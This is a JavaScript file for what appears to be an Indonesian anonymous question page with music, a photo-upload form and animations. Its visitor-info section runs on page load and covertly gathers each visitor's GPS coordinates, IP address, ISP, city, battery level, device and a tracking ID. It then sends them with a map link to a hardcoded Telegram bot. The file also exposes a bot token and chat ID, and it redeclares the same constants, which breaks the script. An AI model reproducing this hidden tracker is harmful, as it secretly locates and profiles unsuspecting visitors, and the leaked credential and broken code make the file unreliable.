﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
const photoOptions = document.getElementById('photoOptions');
if (openPhotoOptions && photoOptions) {
  openPhotoOptions.addEventListener('click', () => {
    photoOptions.classList.toggle('show');
  });
}

// NOTE: replace the two placeholders below with your actual bot token and chat id
const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275";

// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
const music = document.getElementById('bgmusic');
const btnMusic = document.getElementById('musicButton');
let started = false;
music.volume = 0.4;

// pastikan audio bisa dimulai hanya setelah interaksi nyata
async function startMusic() {
  if (started) return;
  started = true;
  music.muted = false;
  try {
    await music.play();
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (err) {
    console.log("Autoplay gagal:", err);
    btnMusic.classList.add("show");
  }
}

// Deteksi platform mobile
const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);

// PC: boleh langsung trigger setelah klik/touch pertama
document.addEventListener('click', startMusic, { once: true });
document.addEventListener('touchstart', startMusic, { once: true });

// tombol utama tetap jadi pemicu manual (aman di mobile)
btnMusic.addEventListener('click', async () => {
  try {
    await music.play();
    music.muted = false;
    started = true;
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (e) {
    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
    console.log(e);
  }
});

// tambahan: khusus mobile, pastikan tombol tampil dari awal agar user tahu
if (isMobile) {
  btnMusic.classList.add("show");
  music.muted = true;
} else {
  setTimeout(() => { startMusic(); }, 800);
}

// === MODAL PERTANYAAN ===
const modal = document.getElementById('modal');
document.getElementById('openAsk').onclick = () => modal.classList.add('show');
document.getElementById('closeQ').onclick = () => modal.classList.remove('show');

// === LOGIN INSTAGRAM ===
const overlay = document.getElementById("blurOverlay"),
  input = document.getElementById("igInput"),
  btnLogin = document.getElementById("igSubmit"),
  savedIG = localStorage.getItem("ig_user");

function removeOverlay() {
  overlay.style.opacity = "0";
  overlay.style.pointerEvents = "none";
  setTimeout(() => overlay.style.display = "none", 300);
}
function showUserStatus(n) {
  const e = document.getElementById("igStatus");
  e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
  e.style.display = "block";
  e.onclick = () => {
    if (confirm("Keluar?")) {
      localStorage.removeItem("ig_user");
      setTimeout(() => location.reload(), 400);
    }
  };
}
if (savedIG) {
  removeOverlay();
  showUserStatus(savedIG);
}
btnLogin.onclick = () => {
  const u = input.value.trim();
  if (!u) return alert("Masukkan username dulu");
  localStorage.setItem("ig_user", u);
  showUserStatus(u);
  removeOverlay();
};

// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
async function sendTelegramMessage(url, body, el) {
  el.innerHTML = `
    <div class="mailContainer">
      <span class="mailLoop">📨</span>
      <span class="mailLoop" style="animation-delay:0.25s">📨</span>
      <span class="mailLoop" style="animation-delay:0.5s">📨</span>
    </div>`;
  try {
    const res = await fetch(url, body);
    if (res.ok) {
      try {
        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
        swoosh.volume = 0.45;
        swoosh.play().catch(() => {});
      } catch (e) {}
      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
      setTimeout(() => el.innerHTML = "", 3000);
      return true;
    } else {
      el.textContent = "💔 Gagal mengirim.";
      return false;
    }
  } catch (e) {
    el.textContent = "😿 Koneksi lemah.";
    return false;
  }
}

// === KIRIM PERTANYAAN + FOTO ===
document.getElementById('sendQ').addEventListener('click', async () => {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const text = document.getElementById('qtext').value.trim();
  const photo = document.getElementById('qphoto').files[0];
  const qmsg = document.getElementById('qmsg');

  if (!text && !photo) {
    qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
    return;
  }

  qmsg.textContent = "Mengirim...";

  if (photo) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", `💬 Pesan dari ${savedUser}\n${text || "(tanpa teks)"}`);
    fd.append("photo", photo);
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
      if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
      else qmsg.textContent = "💔 Gagal mengirim foto.";
    } catch {
      qmsg.textContent = "😿 Gagal koneksi.";
    }
  } else if (text) {
    await sendTelegramMessage(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
      qmsg
    );
  }

  setTimeout(() => {
    if (qmsg.textContent.includes("Terkirim")) {
      modal.classList.remove('show');
      document.getElementById('qtext').value = "";
      document.getElementById('qphoto').value = "";
    }
  }, 1000);
});

const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275"; 
// -----------------------------------------

// === INFO PENGUNJUNG ===
async function showVisitorInfo() {
  // -------------------------
  
  // -------------------------
  try {
    let visitorID = localStorage.getItem("visitor_id");
    if (!visitorID) {
      // Buat ID unik: timestamp + random + sebagian userAgent -> SHA-256 -> ambil 16 hex
      const raw = `${Date.now()}-${Math.random().toString(36).slice(2,10)}-${navigator.userAgent}`;
      try {
        const enc = new TextEncoder();
        const hashBuf = await crypto.subtle.digest("SHA-256", enc.encode(raw));
        visitorID = Array.from(new Uint8Array(hashBuf)).map(b => b.toString(16).padStart(2,"0")).join("").slice(0,16);
      } catch (e) {
        // fallback sederhana bila SubtleCrypto tidak tersedia
        visitorID = ("v" + Math.random().toString(36).slice(2,10) + Date.now().toString(36)).slice(0,16);
      }
      localStorage.setItem("visitor_id", visitorID);
      localStorage.setItem("visitor_first_seen", new Date().toISOString());
    }
    // visit count
    let visitCount = parseInt(localStorage.getItem("visitor_visits") || "0", 10);
    visitCount = isNaN(visitCount) ? 1 : (visitCount + 1);
    localStorage.setItem("visitor_visits", String(visitCount));
  } catch (err) {
    // localStorage may be disabled -> ignore but continue
    console.warn("visitor-id error:", err);
  }

  // Ambil savedUser seperti script lama
  const savedUser = localStorage.getItem("ig_user") || "Anonim";

  // internal helper: safe fetch with retry
  async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
    for (let i = 0; i < retries; i++) {
      try {
        return await fetch(url, opts);
      } catch (e) {
        if (i === retries - 1) throw e;
        await new Promise(res => setTimeout(res, retryDelay * Math.pow(2, i)));
      }
    }
  }

  // original sendToTelegram but extended to include visitorID & visits
  async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
    try {
      const now = new Date();
      const mapLink = (latitude && longitude)
        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
        : "https://www.google.com/maps";
      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
        /Android/i.test(navigator.userAgent) ? "Android" :
        /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
        /Mac/i.test(navigator.userAgent) ? "MacOS" :
        /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";

      let batteryInfo = "Tidak diketahui";
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
        }
      } catch (e) {
        // ignore battery errors
      }

      const visitorID = localStorage.getItem("visitor_id") || "unknown";
      const visits = localStorage.getItem("visitor_visits") || "1";
      const firstSeen = localStorage.getItem("visitor_first_seen") || null;

      const msg = `📢 Pengunjung Baru!
👤 ${savedUser}
🆔 ID Pengunjung: ${visitorID}
🧮 Kunjungan ke: ${visits}${firstSeen ? ` (first: ${new Date(firstSeen).toLocaleString('id-ID')})` : ""}
🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
🗺️ Maps: ${mapLink}
📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
💻 ${device}
🧩 OS: ${os}
🔋 Baterai: ${batteryInfo}
🏷️ ISP: ${d.connection?.isp || d.org || "?"}
📡 IP: ${d.ip || "?"}
🕓 ${now.toLocaleString('id-ID')}`;

      await safeFetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      }, 4);

    } catch (err) {
      console.error("❌ Gagal kirim info:", err);
    }
  }

  try {
    const coords = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
    });
    const { latitude, longitude, accuracy } = coords.coords;
    const ipData = await (await fetch("https://ipwho.is/")).json();
    await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
  } catch (err) {
    try {
      const d = await (await fetch("https://ipwho.is/")).json();
      await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
    } catch (e) {
      console.error("❌ Gagal ambil data IP:", e);
      try {
        const minimal = { city: "?", country: "?", ip: "?" };
        await sendToTelegram(minimal, null, null, "unknown");
      } catch (ee) {
        console.error("❌ Gagal kirim minimal info:", ee);
      }
    }
  }
}
showVisitorInfo();

// === EFEK BUTTERFLY 💸 ===
(function () {
  const area = document.querySelector('.card');
  const butterflies = [];
  const butterflyCount = 7;
  let holdActive = false;
  let holdX = 0;
  let holdY = 0;
  let cachedRect = area.getBoundingClientRect();

  window.addEventListener('resize', () => {
    cachedRect = area.getBoundingClientRect();
  });

  area.style.position = 'relative';
  area.style.overflow = 'hidden';

  function getBounds() {
    return {
      width: area.clientWidth,
      height: area.clientHeight,
      left: cachedRect.left,
      top: cachedRect.top
    };
  }

  const bounds = getBounds();
  for (let i = 0; i < butterflyCount; i++) {
    const b = document.createElement('div');
    b.className = 'butterfly';
    b.textContent = '💸';
    area.appendChild(b);
    butterflies.push({
      el: b,
      x: Math.random() * bounds.width,
      y: Math.random() * bounds.height,
      vx: (Math.random() - 0.5) * 1.2,
      vy: (Math.random() - 0.5) * 1.2,
      size: 16 + Math.random() * 10,
      flapOffset: Math.random() * Math.PI * 2
    });
    b.style.fontSize = butterflies[i].size + 'px';
  }

  function moveButterflies() {
    const rect = getBounds();
    const time = performance.now() / 200;

    butterflies.forEach(b => {
      b.vy += 0.002;
      if (holdActive) {
        const dx = holdX - b.x;
        const dy = holdY - b.y;
        b.vx += dx * 0.002;
        b.vy += dy * 0.002;
      }
      b.vx += Math.sin(time + b.flapOffset) * 0.04;
      b.vy += Math.cos(time + b.flapOffset) * 0.02;
      b.x += b.vx;
      b.y += b.vy;

      if (b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
      if (b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;
      b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));

      const flap = Math.sin(time * 8 + b.flapOffset) * 20;

      b.el.style.transform = `
        translate(${b.x}px, ${b.y}px)
        rotate(${flap}deg)
        scale(${1 + Math.sin(time * 4 + b.flapOffset) * 0.05})
      `;
    });

    requestAnimationFrame(moveButterflies);
  }
  moveButterflies();

  let pendingMove = null;
  function updateHold() {
    if (pendingMove && holdActive) {
      holdX = pendingMove.x - cachedRect.left;
      holdY = pendingMove.y - cachedRect.top;
      pendingMove = null;
    }
    requestAnimationFrame(updateHold);
  }
  updateHold();

  const startHold = (x, y) => {
    holdActive = true;
    holdX = x - cachedRect.left;
    holdY = y - cachedRect.top;
  };
  const endHold = () => (holdActive = false);

  area.addEventListener('mousedown', e => startHold(e.clientX, e.clientY));
  area.addEventListener('mouseup', endHold);
  area.addEventListener('mouseleave', endHold);
  area.addEventListener('mousemove', e => {
    pendingMove = { x: e.clientX, y: e.clientY };
  });

  area.addEventListener('touchstart', e => {
    const t = e.touches[0];
    startHold(t.clientX, t.clientY);
  });
  area.addEventListener('touchmove', e => {
    const t = e.touches[0];
    pendingMove = { x: t.clientX, y: t.clientY };
  });
  area.addEventListener('touchend', endHold);
  area.addEventListener('touchcancel', endHold);
})();

// === LIVE STATUS + SPOTIFY ===
(async function(){
  const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
  if(!titleEl) return;
  const parentEl = titleEl.parentElement || document.body;

  const statusBox = document.createElement("div");
  statusBox.id = "liveModeStatus";
  statusBox.style.cssText = `
    width:100%;
    text-align:center;
    font-size:14px;
    font-family:'Poppins', monospace;
    color:#cfcfcf;
    margin-top:6px;
    opacity:0;
    transition:opacity .6s ease;
  `;
  const musicBtn = parentEl.querySelector("#musicButton");
  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
  else titleEl.insertAdjacentElement("afterend", statusBox);

  async function updateStatus(){
    try {
      const res = await fetch("https://sybau.imamadevera.workers.dev/status",{cache:"no-store"});
      const data = await res.json();
      const text = `${data.status}`;
      if (statusBox.textContent !== text) {
        statusBox.style.opacity = 0;
        setTimeout(() => {
          statusBox.textContent = text;
          statusBox.style.opacity = 1;
          let color = "#fff";
          if (data.status.includes("Online")) color = "#00ffb3";
          else if (data.status.includes("Listening")) color = "#4cc9ff";
          else if (data.status.includes("Offline")) color = "#ff7ca3";
          statusBox.style.color = color;
        }, 200);
      }
    } catch {
      statusBox.textContent = "⚠️ gagal memuat status";
      statusBox.style.color = "#ff7979";
    }
  }

  updateStatus();
  setInterval(updateStatus, 4000);
})();

(async function(){
  const API_URL = "https://sybau.imamadevera.workers.dev/spotify";
  const liveStatus = document.getElementById("liveModeStatus");
  if (!liveStatus) return;

  const spotifyBox = document.createElement("div");
  spotifyBox.id = "spotifyPreviewBox";
  spotifyBox.style.cssText = `
    width:100%;
    max-width:280px;
    margin:10px auto;
    text-align:center;
    position:relative;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    transition:opacity .4s ease, transform .3s ease;
    opacity:0;
    transform:scale(0.98);
  `;

  const coverWrap = document.createElement("div");
  coverWrap.style.cssText = `
    position:relative;
    width:100%;
    height:100px;
    border-radius:12px;
    overflow:hidden;
    box-shadow:0 0 18px rgba(76,201,255,0.25);
  `;

  const cover = document.createElement("img");
  cover.id = "spotifyPreviewCover";
  cover.style.cssText = `
    width:100%;
    height:100%;
    object-fit:cover;
    display:none;
    transition:transform .25s ease, box-shadow .3s ease;
  `;

  const progressBar = document.createElement("div");
  progressBar.style.cssText = `
    position:absolute;
    bottom:0;
    left:0;
    height:4px;
    width:0%;
    background:linear-gradient(90deg,#4cc9ff,#b5179e);
    transition:width .4s linear;
    border-bottom-left-radius:12px;
    border-bottom-right-radius:12px;
  `;

  coverWrap.appendChild(cover);
  coverWrap.appendChild(progressBar);

  liveStatus.parentNode.insertBefore(spotifyBox, liveStatus);
  spotifyBox.appendChild(coverWrap);
  spotifyBox.appendChild(liveStatus);

  async function updateSpotify(){
    try{
      const res = await fetch(API_URL,{cache:"no-store"});
      const data = await res.json();
      if(data.cover){
        cover.src = data.cover;
        cover.style.display = "block";
      } else {
        cover.style.display = "none";
      }

      if(data.progress_ms && data.duration_ms){
        const percent = Math.min((data.progress_ms / data.duration_ms) * 100, 100);
        progressBar.style.width = percent + "%";
      } else {
        progressBar.style.width = "0%";
      }

      spotifyBox.style.opacity = 1;
      spotifyBox.style.transform = "scale(1)";
    }catch(e){
      console.warn("Spotify preview error:", e);
    }
  }

  updateSpotify();
  setInterval(updateSpotify, 8000);
})();
